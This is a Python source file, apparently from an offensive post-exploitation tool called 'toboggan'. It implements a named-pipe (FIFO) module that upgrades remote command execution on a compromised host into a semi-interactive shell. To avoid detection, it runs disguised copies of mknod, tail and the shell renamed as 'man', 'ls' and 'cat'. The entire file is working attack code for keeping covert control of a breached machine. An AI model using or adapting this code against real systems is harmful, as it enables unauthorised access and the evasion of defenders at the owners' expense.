# Built-in imports
import threading
import time

# Local application/library specific imports
from toboggan.core.action import NamedPipe
from toboggan.core import utils


class FifoAction(NamedPipe):

    DESCRIPTION = "Provides semi-interactivity using named pipes (FiFo) for remote command execution."

    def __init__(
        self,
        executor,
        read_interval=0.4,
        command_in=None,
        command_out=None,
    ):
        super().__init__(executor, read_interval, command_in, command_out)
        self.tty = False

    def setup(self):
        altered_mknod = self._executor.create_alterated_copy_of(
            "mknod", copy_name="man"
        )
        self._executor.remote_execute(f"{altered_mknod} {self._stdin} p")

        altered_tail = self._executor.create_alterated_copy_of("tail", copy_name="ls")

        altrered_shell = self._executor.create_alterated_copy_of("$0", copy_name="cat")

        self._executor.remote_execute(
            f"{altered_tail} -f {self._stdin}|{altrered_shell} > {self._stdout} 2>&1 &"
        )

        # Initialize stop flag
        self.__stop_thread = False

    def run(self):
        self.__read_thread = threading.Thread(
            name="output_polling",
            target=self.__poll_output,
            args=(),
            daemon=True,
        )
        self.__read_thread.start()

    def _stop(self):
        self.__stop_thread = True
        if self.__read_thread is not None:
            self.__read_thread.join()

    def execute(self, command: str):
        self._executor.remote_execute(command=f"/bin/echo '{command}' > {self._stdin}")

    def __poll_output(self) -> None:

        while not self.__stop_thread:

            time.sleep(self._read_interval)

            if command_output := self._executor.remote_execute(
                f"cat {self._stdout} && true > {self._stdout}", debug=False
            ):
                if self.tty:
                    print(command_output, end="", flush=True)
                    continue

                if utils.is_shell_prompt_in(command_output):
                    self.tty = True
                    print(command_output, end="", flush=True)
                else:
                    self.tty = False
                    print(command_output)
